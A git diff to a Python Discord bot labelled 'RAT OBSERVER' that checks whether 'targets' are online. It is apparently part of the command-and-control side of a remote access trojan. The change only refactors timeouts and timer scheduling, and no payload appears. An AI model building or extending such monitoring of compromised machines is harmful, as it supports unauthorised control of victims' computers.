@@ -14,10 +14,12 @@ import sched
 
 
 load_dotenv()
-__DISCORD_TARGETS_CHANNEL_ID = int(os.environ.get("DISCORD_TARGETS_CHANNEL_ID")) # should be in int type!
-__DISCORD_GUILD_ID           = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
-__DISCORD_OBSERVER_TOKEN     = os.environ.get("DISCORD_OBSERVER_TOKEN") # should be in string type!
-__API_BASE                   = "http://localhost:8000/api"
+__DISCORD_TARGETS_CHANNEL_ID    = int(os.environ.get("DISCORD_TARGETS_CHANNEL_ID")) # should be in int type!
+__DISCORD_GUILD_ID              = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
+__DISCORD_OBSERVER_TOKEN        = os.environ.get("DISCORD_OBSERVER_TOKEN") # should be in string type!
+__API_BASE                      = "http://localhost:8000/api"
+_CHECK_TARGETS_DELAY            = 10
+_CHECK_TARGET_TIMEOUT           = 5
 
 def __get_targets_channel_by_id(bot):
     guild = bot.get_guild(__DISCORD_GUILD_ID)
@@ -30,11 +32,10 @@ async def __check_target_status(bot, ctx):
     def check(message):
         return message.author.bot and message.content == message_check
 
-    timeout_in_seconds = 10
     online = True
 
     try:
-        await bot.wait_for('message', timeout=timeout_in_seconds, check=check)
+        await bot.wait_for('message', timeout=_CHECK_TARGET_TIMEOUT, check=check)
     except asyncio.TimeoutError:
         online = False
 
@@ -66,8 +67,7 @@ def main():
     @bot.event
     async def on_ready():
         print('RAT OBSERVER ONLINE!')
-        delay = 10
-        threading.Timer(delay, check_targets).start()
+        check_targets()
 
     @bot.event
     async def on_message(message):
@@ -92,7 +92,7 @@ def main():
     @bot.command()
     async def ping(ctx):
         await __check_target_status(bot, ctx)
-
+        threading.Timer(_CHECK_TARGETS_DELAY, check_targets).start()
     bot.run(__DISCORD_OBSERVER_TOKEN)
 
 if __name__ == '__main__':
